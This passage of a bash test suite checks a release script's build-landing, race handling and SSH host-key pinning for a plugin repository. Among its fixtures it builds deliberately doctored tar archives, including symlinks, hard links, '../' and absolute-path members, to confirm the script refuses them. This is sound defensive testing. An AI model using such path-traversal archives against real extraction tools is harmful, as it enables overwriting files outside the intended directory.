built_landed "$what" "$pb/excluded" "$pb/trees/excluded" "$moved" "main's moved tip"

# Main moved by a build input: the build still lands on the tip, and one fresh run is started.
built_setup "$pb/input"
printf 'export const reconnect = true;\n' >> "$pb/input/seed/packages/claude-envoy/src/channel.ts"
move_main "$pb/input" "fix(claude-envoy): reconnect"
built_tar input rebuilt
push_built "$pb/input/a" "$base" "$pb/trees/input.tar"
landed_commit=$(git -C "$pb/input/origin.git" rev-parse main)
what="main moved by a commit to packages/claude-envoy/src/channel.ts"
check "$what: exits 0, starting exactly one fresh run of the workflow on main" "$(is "$rc|$calls" "0|$rebuild_run")"
built_landed "$what" "$pb/input" "$pb/trees/input" "$moved" "main's moved tip"
check "$what: the landing notice names the base, the tip and the commit" "$(contains "$out" "$(landing_notice "$moved")")"
check "$what: the fresh run's notice names the changed input and the run" \
  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/src/channel\.ts')")"

built_setup "$pb/rename"
mkdir -p "$pb/rename/seed/docs"
git -C "$pb/rename/seed" mv packages/claude-envoy/src/channel.ts docs/channel.ts
move_main "$pb/rename" "docs: move channel.ts out of the plugin"
built_tar rename rebuilt
push_built "$pb/rename/a" "$base" "$pb/trees/rename.tar"
landed_commit=$(git -C "$pb/rename/origin.git" rev-parse main)
what="main moved by renaming packages/claude-envoy/src/channel.ts to docs/channel.ts"
check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
built_landed "$what" "$pb/rename" "$pb/trees/rename" "$moved" "main's moved tip"
check "$what: the fresh run's notice names the old path" \
  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/src/channel\.ts')")"

# git diff limits the paths before it pairs renames, so the rename out of the plugin above lists
# the old path with or without --no-renames; a rename inside the inputs shows the difference.
built_setup "$pb/rename-inside"
git -C "$pb/rename-inside/seed" mv packages/claude-envoy/src/channel.ts packages/claude-envoy/src/transport.ts
move_main "$pb/rename-inside" "refactor(claude-envoy): channel.ts becomes transport.ts"
built_tar rename-inside rebuilt
push_built "$pb/rename-inside/a" "$base" "$pb/trees/rename-inside.tar"
landed_commit=$(git -C "$pb/rename-inside/origin.git" rev-parse main)
what="main moved by renaming packages/claude-envoy/src/channel.ts to packages/claude-envoy/src/transport.ts"
check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
check "$what: the fresh run's notice names the old path and the new one (git diff --no-renames)" \
  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/src/channel\.ts packages/claude-envoy/src/transport\.ts')")"

built_setup "$pb/list"
printf '# a note on the list\n' >> "$pb/list/seed/packages/claude-envoy/scripts/build-inputs.txt"
move_main "$pb/list" "docs(claude-envoy): a note on the build input list"
built_tar list rebuilt
push_built "$pb/list/a" "$base" "$pb/trees/list.tar"
landed_commit=$(git -C "$pb/list/origin.git" rev-parse main)
what="main moved by a commit changing only the build input list"
check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
built_landed "$what" "$pb/list" "$pb/trees/list" "$moved" "main's moved tip"
check "$what: the fresh run's notice names the list" \
  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/scripts/build-inputs\.txt')")"

built_setup "$pb/nolist" --no-list
mkdir -p "$pb/nolist/seed/docs"
printf 'notes\n' > "$pb/nolist/seed/docs/notes.md"
move_main "$pb/nolist" "docs: notes landing after the build started"
built_tar nolist rebuilt
push_built "$pb/nolist/a" "$base" "$pb/trees/nolist.tar"
landed_commit=$(git -C "$pb/nolist/origin.git" rev-parse main)
what="a base without the build input list, main moved by a docs-only commit"
check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
built_landed "$what" "$pb/nolist" "$pb/trees/nolist" "$moved" "main's moved tip"
check "$what: a ::warning names the list file" \
  "$(contains "$out" "^::warning title=No build input list::$base holds no pathspec in packages/claude-envoy/scripts/build-inputs\.txt, the list of the build's inputs, so every change since it counts as a build input$")"
check "$what: the fresh run's notice says why" \
  "$(contains "$out" "^::notice title=A fresh run started::the build landed on main as $landed_commit, but $base holds no pathspec in packages/claude-envoy/scripts/build-inputs\.txt, .*, so a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")"

built_setup "$pb/ghfail"
printf 'export const reconnect = true;\n' >> "$pb/ghfail/seed/packages/claude-envoy/src/channel.ts"
move_main "$pb/ghfail" "fix(claude-envoy): reconnect"
built_tar ghfail rebuilt
push_built "$pb/ghfail/a" "$base" "$pb/trees/ghfail.tar" GH_TEST_FAIL=run
landed_commit=$(git -C "$pb/ghfail/origin.git" rev-parse main)
what="gh workflow run fails after a landing with a changed input"
check "$what: exits 1, after one attempt to start a run" "$(is "$rc|$calls" "1|$rebuild_run")"
check "$what: origin's main holds the landed commit, on the moved tip" \
  "$(is "$(git -C "$pb/ghfail/origin.git" rev-list --parents -n 1 main)|$left" "$landed_commit $moved|0")"
check "$what: the error says the build landed and names the command a person runs" \
  "$(contains "$out" "^::error::release-push\.sh push-built: the build already landed on main as $landed_commit, but build inputs changed between $base and $moved: packages/claude-envoy/src/channel\.ts, so main's build is one run behind its inputs, and starting a fresh run of claude-envoy-rebuild\.yaml on main failed; start one by hand: gh workflow run claude-envoy-rebuild\.yaml --repo example/repo --ref main$")"

# Main already holds a build of a commit the base does not descend from: nothing lands, no run.
built_setup "$pb/newer"
printf 'notes\n' > "$pb/newer/seed/notes.md"
move_main "$pb/newer" "docs: a merge after the base"
newer_base=$moved
bot_rebuild "$pb/newer" newer "$newer_base"
built_tar newer rebuilt
push_built "$pb/newer/a" "$base" "$pb/trees/newer.tar"
what="main already holds github-actions[bot]'s rebuild of a commit after the base"
check "$what: exits 0, pushing nothing, calling no gh, leaving nothing in TMPDIR" \
  "$(is "$rc|$(git -C "$pb/newer/origin.git" rev-parse main)|$calls|$left" "0|$rebuilt||0")"
check "$what: the notice names the commit main's build was made from" \
  "$(contains "$out" "^::notice title=Nothing pushed; main holds a newer build::main already holds a build of $newer_base, newer than $base, the commit this build was made from, so nothing was pushed and no run was started$")"

# Run from a subdirectory of the clone, as a job that moved into the package would: push-built
# moves to the repository's root before it reads any repository path, so main's build is still
# found and the newer-build rule still refuses, and a tar named relative to that subdirectory still
# resolves from there.
built_setup "$pb/subdir-newer"
printf 'notes\n' > "$pb/subdir-newer/seed/notes.md"
move_main "$pb/subdir-newer" "docs: a merge after the base"
newer_base=$moved
bot_rebuild "$pb/subdir-newer" newer "$newer_base"
built_tar subdir-newer rebuilt
PB_SUBDIR=packages/claude-envoy
push_built "$pb/subdir-newer/a" "$base" "$pb/trees/subdir-newer.tar"
PB_SUBDIR=''
what="run from packages/claude-envoy, main holding a newer build"
check "$what: exits 0, pushing nothing, calling no gh, leaving nothing in TMPDIR" \
  "$(is "$rc|$(git -C "$pb/subdir-newer/origin.git" rev-parse main)|$calls|$left" "0|$rebuilt||0")"
check "$what: the notice names the commit main's build was made from" \
  "$(contains "$out" "^::notice title=Nothing pushed; main holds a newer build::main already holds a build of $newer_base, newer than $base, the commit this build was made from, so nothing was pushed and no run was started$")"

built_setup "$pb/subdir-land"
built_tar subdir-land rebuilt
PB_SUBDIR=packages/claude-envoy
# Four levels up from <clone>/packages/claude-envoy is $pb, which holds trees/.
push_built "$pb/subdir-land/a" "$base" ../../../../trees/subdir-land.tar
PB_SUBDIR=''
what="run from packages/claude-envoy with a relative tar path"
check "$what: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
built_landed "$what" "$pb/subdir-land" "$pb/trees/subdir-land" "$base" "the base"

built_setup "$pb/forged"
printf 'notes\n' > "$pb/forged/seed/notes.md"
move_main "$pb/forged" "docs: a merge after the base"
plugin_tree "$pb/forged/seed/packages/claude-envoy" forged
git -C "$pb/forged/seed" add -A
git -C "$pb/forged/seed" commit -q -m "chore(claude-envoy): rebuild dist/ and legion/ from ${base:0:12} [skip ci]"
git -C "$pb/forged/seed" push -q "$pb/forged/origin.git" main
forged=$(git -C "$pb/forged/seed" rev-parse HEAD)
built_tar forged rebuilt
push_built "$pb/forged/a" "$base" "$pb/trees/forged.tar"
what="main's newest build is a person's commit with the rebuild subject naming the base"
check "$what: read as a build of that commit itself, newer than the base: nothing pushed, no gh call" \
  "$(is "$rc|$(git -C "$pb/forged/origin.git" rev-parse main)|$calls|$left" "0|$forged||0")"
check "$what: the notice names that commit, not the base" \
  "$(contains "$out" "^::notice title=Nothing pushed; main holds a newer build::main already holds a build of $forged, newer than $base, ")"

built_setup "$pb/equal"
bot_rebuild "$pb/equal" rebuilt "$base"
built_tar equal rebuilt
push_built "$pb/equal/a" "$base" "$pb/trees/equal.tar"
what="main already holds github-actions[bot]'s rebuild of the base itself, with this build's bytes"
check "$what: exits 0, pushing nothing, calling no gh, leaving nothing in TMPDIR" \
  "$(is "$rc|$(git -C "$pb/equal/origin.git" rev-parse main)|$calls|$left" "0|$rebuilt||0")"
check "$what: the notice says main's tip already matches" \
  "$(contains "$out" "^::notice title=Nothing to push::main.s packages/claude-envoy/dist and packages/claude-envoy/legion at $rebuilt already match this build$")"

built_setup "$pb/equal-input"
bot_rebuild "$pb/equal-input" rebuilt "$base"
printf 'export const reconnect = true;\n' >> "$pb/equal-input/seed/packages/claude-envoy/src/channel.ts"
move_main "$pb/equal-input" "fix(claude-envoy): reconnect"
built_tar equal-input rebuilt
push_built "$pb/equal-input/a" "$base" "$pb/trees/equal-input.tar"
what="main already holds this build, and an input changed after it"
check "$what: exits 0, pushing nothing, starting exactly one fresh run" \
  "$(is "$rc|$(git -C "$pb/equal-input/origin.git" rev-parse main)|$calls|$left" "0|$moved|$rebuild_run|0")"
check "$what: the notices say nothing to push and name the changed input and the run" \
  "$(is "$(contains "$out" "^::notice title=Nothing to push::.* at $moved already match this build$")|$(contains "$out" "^::notice title=A fresh run started::build inputs changed between $base and $moved: packages/claude-envoy/src/channel\.ts, so a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")" 'true|true')"

# Main rewritten, so its tip does not descend from the base: nothing lands, one fresh run.
built_setup "$pb/rewritten"
sibling=$(git -C "$pb/rewritten/seed" commit-tree -p "$first" -m "fix: main rewritten" "$first^{tree}")
git -C "$pb/rewritten/seed" push -q "$pb/rewritten/origin.git" "+$sibling:refs/heads/main"
built_tar rewritten rebuilt
push_built "$pb/rewritten/a" "$base" "$pb/trees/rewritten.tar"
what="main rewritten to a sibling of the base"
check "$what: exits 0, pushing nothing, starting exactly one fresh run, leaving nothing in TMPDIR" \
  "$(is "$rc|$(git -C "$pb/rewritten/origin.git" rev-parse main)|$calls|$left" "0|$sibling|$rebuild_run|0")"
check "$what: the notice names both commits and the run" \
  "$(contains "$out" "^::notice title=Nothing pushed; a fresh run started::main's tip $sibling does not descend from $base, the commit the build was made from, so main was rewritten; nothing was pushed, and a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")"
push_built "$pb/rewritten/a" "$base" "$pb/trees/rewritten.tar" GH_TEST_FAIL=run
check "$what, gh workflow run fails: exits 1, naming the command a person runs, origin as it was" \
  "$(is "$rc|$(contains "$out" "^::error::release-push\.sh push-built: main's tip $sibling does not descend from $base, .*, and starting a fresh run of claude-envoy-rebuild\.yaml on main failed; start one by hand: gh workflow run claude-envoy-rebuild\.yaml --repo example/repo --ref main$")|$(git -C "$pb/rewritten/origin.git" rev-parse main)" "1|true|$sibling")"

# Main moves again between push-built's fetch and its push: the `git` wrapper runs the real git,
# and after the first fetch alone it lands one more merge on origin's main from the seed.
mkdir -p "$pb/race-bin"
cat > "$pb/race-bin/git" <<'GIT'
#!/usr/bin/env bash
status=0
"$REAL_GIT" "$@" || status=$?
if [ "$1" = fetch ] && [ ! -e "$RACE_DIR/raced" ]; then
  : > "$RACE_DIR/raced"
  "$REAL_GIT" -C "$RACE_DIR/seed" commit -q --allow-empty -m "fix: a merge landing during the push"
  "$REAL_GIT" -C "$RACE_DIR/seed" push -q "$RACE_DIR/origin.git" main
fi
exit "$status"
GIT
chmod +x "$pb/race-bin/git"
real_git=$(command -v git)
# race_run <name> [VAR=value...]: a case under $pb/<name> whose main moved by a build input, then
# push_built through the wrapper; leaves main's new tip, the wrapper's merge, in raced.
race_run() {
  local dir="$pb/$1"
  shift
  built_setup "$dir"
  printf 'export const reconnect = true;\n' >> "$dir/seed/packages/claude-envoy/src/channel.ts"
  move_main "$dir" "fix(claude-envoy): reconnect"
  built_tar "${dir##*/}" rebuilt
  push_built "$dir/a" "$base" "$pb/trees/${dir##*/}.tar" PATH="$pb/race-bin:$work/restart-bin:$PATH" \
    REAL_GIT="$real_git" RACE_DIR="$dir" "$@"
  raced=$(git -C "$dir/origin.git" rev-parse main)
  check "$what: the wrapper landed one merge on the moved tip, and nothing else landed" \
    "$(is "$(git -C "$dir/origin.git" rev-list --parents -n 1 main)|$(git -C "$dir/origin.git" log -1 --format=%s main)" "$raced $moved|fix: a merge landing during the push")"
}
what="main moves again after push-built's fetch, with a changed input"
race_run race
check "$what: exits 0, starting exactly one fresh run (land_on_main's, no second one)" \
  "$(is "$rc|$calls|$left" "0|$rebuild_run|0")"
check "$what: land_on_main's notice names the tip push-built built on and main's new tip" \
  "$(contains "$out" "^::notice title=Nothing pushed; a fresh run started::main moved from $moved, the commit [0-9a-f]* was made on, to $raced, so [0-9a-f]* was not pushed; a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")"
check "$what: no notice of push-built's own fresh run" "$(is "$(contains "$out" 'A fresh run started')" false)"
what="main moves again after push-built's fetch, gh workflow run fails"
race_run race-gh GH_TEST_FAIL=run
check "$what: exits 1, after one attempt to start a run, leaving nothing in TMPDIR" \
  "$(is "$rc|$calls|$left" "1|$rebuild_run|0")"
check "$what: the error names both commits and the command a person runs" \
  "$(contains "$out" "^::error::release-push\.sh push-built: main moved from $moved, the commit [0-9a-f]* was made on, to $raced, and starting a fresh run of claude-envoy-rebuild\.yaml on main failed; start one by hand: gh workflow run claude-envoy-rebuild\.yaml --repo example/repo --ref main$")"

built_setup "$pb/rejected"
printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$pb/rejected/origin.git/hooks/pre-receive"
chmod +x "$pb/rejected/origin.git/hooks/pre-receive"
built_tar rejected rebuilt
push_built "$pb/rejected/a" "$base" "$pb/trees/rejected.tar"
check "a push rejected while main's tip is still the base: exits 1, calling no gh" "$(is "$rc|$calls" "1|")"
check "a push rejected while main's tip is still the base: says so" \
  "$(contains "$out" "^::error::release-push\.sh push-built: the push of [0-9a-f]* to main was rejected while main's tip is still $base, the commit [0-9a-f]* was made on, so no newer commit beat it; the push itself failed$")"
check "a push rejected while main's tip is still the base: origin is untouched" \
  "$(is "$(git -C "$pb/rejected/origin.git" rev-parse main)|$left" "$base|0")"

built_setup "$pb/nokey"
record_hook "$pb/nokey/origin.git"
built_tar nokey rebuilt
: > "$pb/nokey/seen"
push_built "$pb/nokey/a" "$base" "$pb/trees/nokey.tar" DEPLOY_KEY= PUSH_SEEN="$pb/nokey/seen"
check "no DEPLOY_KEY: exits 1, with an ::error:: naming the command and the variable" \
  "$(is "$rc|$(contains "$out" '^::error::release-push\.sh push-built: DEPLOY_KEY')" '1|true')"
check "no DEPLOY_KEY: nothing was pushed, origin is untouched, gh never called, nothing made in TMPDIR" \
  "$(is "$(<"$pb/nokey/seen")|$(git -C "$pb/nokey/origin.git" rev-parse main)|$calls|$left" "|$base||0")"

# A doctored tar is refused before any fetch, however main moved: exit 1, origin as it was, no gh
# call, nothing in TMPDIR.
built_tar symlink-moved rebuilt 'ln -s envoy-channel.js dist/link.js'
for how in docs input; do
  dir="$pb/doctored-$how"
  built_setup "$dir"
  if [ "$how" = docs ]; then
    printf 'notes\n' > "$dir/seed/notes.md"
    what="a symlink member, main moved by a docs-only commit"
  else
    printf 'export const reconnect = true;\n' >> "$dir/seed/packages/claude-envoy/src/channel.ts"
    what="a symlink member, main moved by a build input"
  fi
  move_main "$dir" "fix: a merge landing after the build started"
  push_built "$dir/a" "$base" "$pb/trees/symlink-moved.tar"
  check "$what: exits 1, naming the member" \
    "$(is "$rc|$(contains "$out" "^::error::release-push\.sh push-built: member dist/link\.js of .*symlink-moved\.tar is a symlink")" "1|true")"
  check "$what: origin as it was, no gh call, nothing in TMPDIR" \
    "$(is "$(git -C "$dir/origin.git" rev-parse main)|$calls|$left" "$moved||0")"
done

# The refusals share one origin and clone, since each must leave both as they were.
built_setup "$pb/r"
rbase=$base rfirst=$first
# built_refused <description> <regex>: exit 1, an ::error:: matching <regex>, origin's main, the
# clone's HEAD and its work tree (`git status --porcelain`, against $rstatus) as they were, and no
# gh call.
rstatus=''
built_refused() {
  check "$1: exits 1" "$(is "$rc" 1)"
  check "$1: the error names it" "$(contains "$out" "^::error::release-push\.sh push-built: $2")"
  check "$1: origin, the clone and its work tree as they were; no gh call" \
    "$(is "$(git -C "$pb/r/origin.git" rev-parse main)|$(git -C "$pb/r/a" rev-parse HEAD)|$(git -C "$pb/r/a" status --porcelain)|$calls" "$rbase|$rbase|$rstatus|")"
}
tars="$pb/trees"
built_tar symlink rebuilt 'ln -s envoy-channel.js dist/link.js'
push_built "$pb/r/a" "$rbase" "$tars/symlink.tar"
built_refused "a symlink member" "member dist/link\.js of .*symlink\.tar is a symlink"
built_tar hardlink rebuilt 'ln dist/dispatch.js dist/dispatch-copy.js'
push_built "$pb/r/a" "$rbase" "$tars/hardlink.tar"
built_refused "a hard link member" "member dist/dispatch[-a-z]*\.js of .*hardlink\.tar is a hard link"
built_tar dotdot rebuilt '' --transform 's,^dist/dispatch\.js$,../dispatch.js,' dist legion
check "the ../ tar holds ../dispatch.js" "$(contains "$(tar -tf "$tars/dotdot.tar" 2>/dev/null)" '^\.\./dispatch\.js$')"
push_built "$pb/r/a" "$rbase" "$tars/dotdot.tar"
built_refused "a ../ member" "member \.\./dispatch\.js of .* has a '\.\.' component"
built_tar dotdot-inner rebuilt '' --transform 's,^dist/dispatch\.js$,dist/../../dispatch.js,' dist legion
push_built "$pb/r/a" "$rbase" "$tars/dotdot-inner.tar"
built_refused "a member climbing out through dist/../.." "member dist/\.\./\.\./dispatch\.js of .* has a '\.\.' component"
built_tar absolute rebuilt '' --transform 's,^dist/dispatch\.js$,/dispatch.js,' -P dist legion
check "the absolute tar holds /dispatch.js" "$(contains "$(tar -tf "$tars/absolute.tar" 2>/dev/null)" '^/dispatch\.js$')"
push_built "$pb/r/a" "$rbase" "$tars/absolute.tar"
built_refused "an absolute member" "member /dispatch\.js of .* is an absolute path"
built_tar readme rebuilt 'printf "x\n" > README.md' dist legion README.md
push_built "$pb/r/a" "$rbase" "$tars/readme.tar"
built_refused "a member outside the two directories, README.md" "member README\.md of .* is not dist, legion or a path under them"
built_tar src rebuilt 'mkdir src && printf "x\n" > src/x' dist legion src
push_built "$pb/r/a" "$rbase" "$tars/src.tar"
built_refused "a member outside the two directories, src/x" "member src/ of .* is not dist, legion or a path under them"
built_tar space rebuilt 'printf "x\n" > "dist/a b.js"'
push_built "$pb/r/a" "$rbase" "$tars/space.tar"
# %q quotes the space as 'dist/a b.js' or dist/a\ b.js, by bash version.
built_refused "a member whose name holds another character, a space" 'member .\{0,1\}dist/a\\\{0,1\} b\.js.\{0,1\} of .* is not dist, legion or a path under them'
built_tar executable rebuilt 'chmod +x dist/envoy-channel.js'
push_built "$pb/r/a" "$rbase" "$tars/executable.tar"
built_refused "an executable member" "member dist/envoy-channel\.js of .* has the mode -rwx[-rwx]*, with an execute"
built_tar no-channel rebuilt 'rm dist/envoy-channel.js'
push_built "$pb/r/a" "$rbase" "$tars/no-channel.tar"
built_refused "a tar missing dist/envoy-channel.js" ".*no-channel\.tar lacks dist/envoy-channel\.js, a file every build of the plugin holds"
built_tar no-manifest rebuilt 'rm legion/.claude-plugin/plugin.json'
push_built "$pb/r/a" "$rbase" "$tars/no-manifest.tar"
built_refused "a tar missing legion/.claude-plugin/plugin.json" ".*no-manifest\.tar lacks legion/\.claude-plugin/plugin\.json"
built_tar no-agents rebuilt 'rm -r legion/agents'
push_built "$pb/r/a" "$rbase" "$tars/no-agents.tar"
built_refused "a tar with no file under legion/agents/" ".*no-agents\.tar holds no file under legion/agents/"
built_tar good rebuilt
for forged in HEAD "${rbase:0:12}" "${rbase^^}" "$rbase "; do
  push_built "$pb/r/a" "$forged" "$tars/good.tar"
  printf -v shown '%q' "$forged"
  built_refused "a base that is not 40 lower-case hex, $shown" "the base commit .* is not 40 lower-case hex"
done
push_built "$pb/r/a" "$rfirst" "$tars/good.tar"
built_refused "HEAD not at the base" "HEAD is $rbase, not $rfirst, the commit the build was made from"
printf 'edited\n' >> "$pb/r/a/README.md"
rstatus=' M README.md'
push_built "$pb/r/a" "$rbase" "$tars/good.tar"
built_refused "a dirty work tree" "the work tree is not clean ( M README\.md)"
git -C "$pb/r/a" checkout -q -- README.md
rstatus=''
push_built "$pb/r/a" "$rbase" "$pb/trees/no-such.tar"
built_refused "a tar that does not exist" "listing .*no-such\.tar failed"

echo
echo "Case: check-built accepts what push-built accepts and refuses what it refuses, writing nothing"
# The tars above, plus a skill script made executable (as `cp -R` stages a skill's mode into
# legion/) and a build lacking the dispatch bundle (a renamed entry in BUNDLE_ENTRYPOINTS). Each
# run is from an empty directory outside any repository, with an empty TMPDIR, and the tar's
# directory is compared before and after: check-built needs no checkout and writes nothing.
cb="$pb/cb"
# check_built <tar> [<arg>...]: runs `release-push.sh check-built <tar> [<arg>...]` from the empty
# directory $cb/run with TMPDIR=$cb/tmp; leaves its exit code in rc, its combined output in out,
# and in written how many entries those two directories hold afterwards and whether the trees
# directory's listing and checksums changed.
check_built() {
  local before
  rm -rf "$cb" && mkdir -p "$cb/run" "$cb/tmp"
  before=$(cd "$tars" && find . -printf '%m %p\n' | sort && find . -type f -exec sha256sum {} + | sort)
  set +e
  out=$(cd "$cb/run" && env TMPDIR="$cb/tmp" "$release_push" check-built "$@" 2>&1)
  rc=$?
  set -e
  written="$(find "$cb/run" "$cb/tmp" -mindepth 1 | wc -l)|$(is "$(cd "$tars" && find . -printf '%m %p\n' | sort && find . -type f -exec sha256sum {} + | sort)" "$before")"
}
# check_refused <description> <regex>: exit 1, an ::error:: of check-built matching <regex>, and
# nothing written.
check_refused() {
  check "check-built, $1: exits 1, writing nothing" "$(is "$rc|$written" "1|0|true")"
  check "check-built, $1: the error names it" "$(contains "$out" "^::error::release-push\.sh check-built: $2")"
}
check_built "$tars/good.tar"
check "check-built, a good build: exits 0, printing nothing and writing nothing" "$(is "$rc|$out|$written" "0||0|true")"
check_built "$tars/executable.tar"
check_refused "an executable member" "member dist/envoy-channel\.js of .*executable\.tar has the mode -rwx[-rwx]*, with an execute"
built_tar skill-script rebuilt 'mkdir legion/skills/legion-worker/scripts && printf "x\n" > legion/skills/legion-worker/scripts/x.sh && chmod 755 legion/skills/legion-worker/scripts/x.sh'
check_built "$tars/skill-script.tar"
check_refused "an executable skill script" "member legion/skills/legion-worker/scripts/x\.sh of .* has the mode -rwxr-xr-x, with an execute"
check_built "$tars/symlink.tar"
check_refused "a symlink member" "member dist/link\.js of .*symlink\.tar is a symlink"
check_built "$tars/space.tar"
check_refused "a member whose name holds a space" 'member .\{0,1\}dist/a\\\{0,1\} b\.js.\{0,1\} of .* is not dist, legion or a path under them'
built_tar no-dispatch rebuilt 'rm dist/dispatch.js'
check_built "$tars/no-dispatch.tar"
check_refused "a tar missing dist/dispatch.js" ".*no-dispatch\.tar lacks dist/dispatch\.js, a file every build of the plugin holds"
check_built "$tars/no-agents.tar"
check_refused "a tar with no file under legion/agents/" ".*no-agents\.tar holds no file under legion/agents/"
check_built "$tars/no-such.tar"
check_refused "a tar that does not exist" "listing .*no-such\.tar failed"
check_built "$tars/good.tar" extra
check_refused "a second argument" "usage: release-push\.sh check-built <tar>$"

echo
echo "Case: extract-built replaces the two directories with exactly a checked build, and leaves them untouched when it refuses one"
# A clone of a push-built origin, whose two directories hold the seed build and an untracked file
# of their own. extract-built runs from a subdirectory of the clone with the tar's path relative to
# it, with no credential in its environment, as the rebuild's build job and the claude-envoy job
# run it.
built_setup "$pb/x"
xa="$pb/x/a"
xbase=$base
printf 'stale\n' > "$xa/packages/claude-envoy/dist/stale.js"
# extract_built <tar> [<arg>...]: runs `release-push.sh extract-built <tar> [<arg>...]` from
# $xa/packages; leaves its exit code in rc and its combined output in out.
extract_built() {
  set +e
  out=$(cd "$xa/packages" && env -u DEPLOY_KEY "$release_push" extract-built "$@" 2>&1)
  rc=$?
  set -e
}
# x_tree: every entry under the clone's two directories, with its type and mode, then every
# file's checksum.
x_tree() {
  (cd "$xa/packages/claude-envoy" && find dist legion -printf '%y %m %p\n' | LC_ALL=C sort &&
    find dist legion -type f -exec sha256sum {} + | LC_ALL=C sort)
}
x_before=$(x_tree)
extract_built ../../../trees/executable.tar
check "extract-built, an executable member: exits 1, naming it" \
  "$(is "$rc|$(contains "$out" "^::error::release-push\.sh extract-built: member dist/envoy-channel\.js of .*executable\.tar has the mode -rwx[-rwx]*, with an execute")" "1|true")"
check "extract-built, an executable member: the two directories are untouched" "$(is "$(x_tree)" "$x_before")"
extract_built ../../../trees/land.tar extra
check "extract-built, a second argument: exits 1 with its usage, the directories untouched" \
  "$(is "$rc|$(contains "$out" '^::error::release-push\.sh extract-built: usage: release-push\.sh extract-built <tar>$')|$(is "$(x_tree)" "$x_before")" "1|true|true")"
extract_built ../../../trees/land.tar
check "extract-built, a good build: exits 0, printing nothing" "$(is "$rc|$out" "0|")"
check "extract-built, a good build: the two directories hold exactly the tar's files, the stale file and the one the build dropped deleted" \
  "$(is "$(cd "$xa/packages/claude-envoy" && find dist legion -type f | LC_ALL=C sort)" "$(cd "$tars/land" && find dist legion -type f | LC_ALL=C sort)")"
check "extract-built, a good build: the files hold the build's bytes" \
  "$(diff -r "$tars/land/dist" "$xa/packages/claude-envoy/dist" >/dev/null && diff -r "$tars/land/legion" "$xa/packages/claude-envoy/legion" >/dev/null && echo true || echo false)"
check "extract-built, a good build: HEAD and the index as they were, the rest of the tree untouched" \
  "$(is "$(git -C "$xa" rev-parse HEAD)|$(git -C "$xa" diff --cached --name-only)|$(git -C "$xa" status --porcelain -- README.md)" "$xbase||")"

echo
echo "Case: push-tag holds GitHub's host keys and refuses any other"
# These reach github.com over SSH with a throwaway key no repository trusts, so each push is
# refused; what matters is which refusal. Without the network they are skipped, not counted.
if timeout 10 bash -c '</dev/tcp/github.com/22' 2>/dev/null; then
  # github_push <script> [VAR=value...]: runs <script> push-tag against a repository that does not
  # exist, with the throwaway key; leaves rc, out and left as push_tag does.
  github_push() {
    local script=$1
    shift
    rm -rf "$pt/tmp" && mkdir "$pt/tmp"
    set +e
    out=$(cd "$pt/a" && env TMPDIR="$pt/tmp" GITHUB_REPOSITORY=sjawhar/release-push-test-nonexistent \
      DEPLOY_KEY="$(<"$work/deploy")" "$@" "$script" push-tag pkg-v1.0.1 2>&1)
    rc=$?
    set -e
    left=$(find "$pt/tmp" -mindepth 1 | wc -l)
  }
  github_push "$release_push"
  check "the pinned keys: GitHub's host key is accepted and the throwaway key refused" \
    "$([ "$rc" != 0 ] && contains "$out" 'Permission denied (publickey)' || echo false)"
  check "the pinned keys: nothing is left in TMPDIR" "$(is "$left" 0)"
  # A copy of the script whose only pinned key is one GitHub does not hold.
  mkdir -p "$pt/swapped"
  ssh-keygen -q -t ed25519 -N '' -f "$pt/swapped/other"
  python3 - "$release_push" "$pt/swapped/release-push.sh" "$(cut -d' ' -f2 "$pt/swapped/other.pub")" <<'PY'
import re
import sys

source, target, other = sys.argv[1:]
text = open(source).read()
pinned = re.findall(r"(?m)^github\.com \S+ \S+$", text)
assert len(pinned) == 3, pinned
text = re.sub(r"(?m)^github\.com ssh-ed25519 \S+$", "github.com ssh-ed25519 " + other, text)
text = re.sub(r"(?m)^github\.com (ecdsa-sha2-nistp256|ssh-rsa) \S+\n", "", text)
open(target, "w").write(text)
PY
  chmod +x "$pt/swapped/release-push.sh"
  github_push "$pt/swapped/release-push.sh"
  check "a swapped host key: exits non-zero, the host key refused before any login" \
    "$([ "$rc" != 0 ] && contains "$out" 'REMOTE HOST IDENTIFICATION HAS CHANGED\|Host key verification failed' || echo false)"
  check "a swapped host key: no login was tried" "$(is "$(contains "$out" 'Permission denied (publickey)')" false)"
  check "a swapped host key: nothing is left in TMPDIR" "$(is "$left" 0)"
else
  echo "  SKIP: the host-key cases (github.com:22 is unreachable)"
fi

echo
echo "Case: push-tag's pinned host keys are the ones GitHub publishes"
# A rotation shows up here first. It needs gh signed in and the network, and is skipped without.
if command -v gh >/dev/null && published=$(gh api meta --jq '.ssh_keys[]' 2>/dev/null) && [ -n "$published" ]; then
  pinned=$(sed -n 's/^github\.com //p' "$release_push" | sort)
  check "the pinned keys equal gh api meta's ssh_keys" "$(is "$pinned" "$(sort <<<"$published")")"
else
  echo "  SKIP: the published-keys comparison (gh api meta failed: no gh, no sign-in or no network)"
fi

echo
echo "Case: handed refuses a version or a hand-over a compromised build could make, and prints the tag"
# Each case fills a directory with the four archives a release of 0.1.0 ships (dummy bytes: the
# bytes are the build job's to choose), changes one thing, and runs `handed envoy-infra-v
# <version> <dir>` with the names publish builds from the version it is given. It runs in $hd, so
# a version that executed would leave its proof file there.
hd="$work/handed"
mkdir -p "$hd"
handed_targets=(linux-amd64 linux-arm64 darwin-amd64 darwin-arm64)
# handed_run <case> <version> [<mutation>]: fills $hd/<case> with the 0.1.0 archives, runs the
# shell text <mutation> in it, then runs handed; leaves rc, out (stdout) and err (stderr).
handed_run() {
  local name=$1 version=$2 mutation=${3:-} dir="$hd/$1" target names=()
  mkdir "$dir"
  for target in "${handed_targets[@]}"; do
